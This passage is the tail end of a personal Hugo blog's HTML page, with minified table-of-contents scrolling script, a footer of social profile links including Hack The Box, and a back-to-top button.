t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
+<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
+<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
+<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
+Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
+</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
